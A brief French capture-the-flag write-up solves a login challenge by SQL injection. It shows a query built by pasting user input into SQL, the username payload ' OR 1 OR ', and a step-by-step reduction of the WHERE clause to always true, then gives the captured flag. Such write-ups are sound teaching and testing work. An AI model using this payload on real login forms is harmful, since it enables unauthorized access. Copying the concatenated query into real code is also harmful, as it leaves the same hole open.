La requête est :
SELECT username, password FROM users WHERE username=’$username’ AND password=’$password’

L'opération AND a préséence sur les autres

Donc en mettant dans username ceci:
' OR 1 OR '

on aura:
SELECT username, password FROM users WHERE username='' OR 1 OR '' AND password=''

'' AND password='' = False
Ca laisse donc :
SELECT username, password FROM users WHERE username='' OR 1 OR False

username='' OR 1 = True
Ca laisse donc :
SELECT username, password FROM users WHERE True OR False donc toujours True

FLAG-Yk3Hfovvb5kALU9hI2545MaY